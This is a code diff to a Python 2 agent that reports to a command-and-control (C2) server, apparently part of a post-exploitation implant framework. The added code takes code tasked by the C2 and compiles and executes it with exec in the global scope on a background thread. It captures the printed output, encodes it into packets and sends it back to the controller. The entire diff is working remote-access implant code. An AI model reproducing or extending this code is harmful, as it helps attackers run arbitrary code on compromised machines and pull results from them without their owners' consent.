@@ -194,6 +194,19 @@ def processTasking(data):
         print "processTasking exception:",e
         pass
 
+def processJobTasking(result):
+    # process job data packets
+    #  - returns to the C2
+    # execute/process the packets and get any response
+    try:
+        resultPackets = ""
+        if result:
+            resultPackets += result
+        # send packets
+        sendMessage(resultPackets)
+    except Exception as e:
+        print "processTasking exception:",e
+        pass
 
 def processPacket(taskingID, data):
 
@@ -404,14 +417,33 @@ def start_job(code):
     codeBlock = "def method():\n" + indent(code)
 
     # register the code block
-    exec(codeBlock)
+    code_obj = compile(codeBlock, '<string>', 'exec')
+    # code needs to be in the global listing
+    # not the locals() scope
+    exec code_obj in globals()
     
     # create/start/return the thread
-    codeThread = ThreadWithReturnValue(target=method, args=())
+    # call the job_func so sys data can be cpatured
+    codeThread = ThreadWithReturnValue(target=job_func, args=())
     codeThread.start()
     
     jobs.append(codeThread)
 
+def job_func():
+    try:
+        old_stdout = sys.stdout  
+        sys.stdout = mystdout = StringIO()
+        # now call the function required 
+        # and capture the output via sys
+        method()
+        sys.stdout = old_stdout
+        dataStats_2 = mystdout.getvalue()
+        result = encodePacket(110, str(dataStats_2))
+        processJobTasking(result)
+    except Exception as e:
+        p = "error executing specified Python job data: " + str(e)
+        result = encodePacket(0, p)
+        processJobTasking(result)
 
 # additional implementation methods
 def run_command(command):
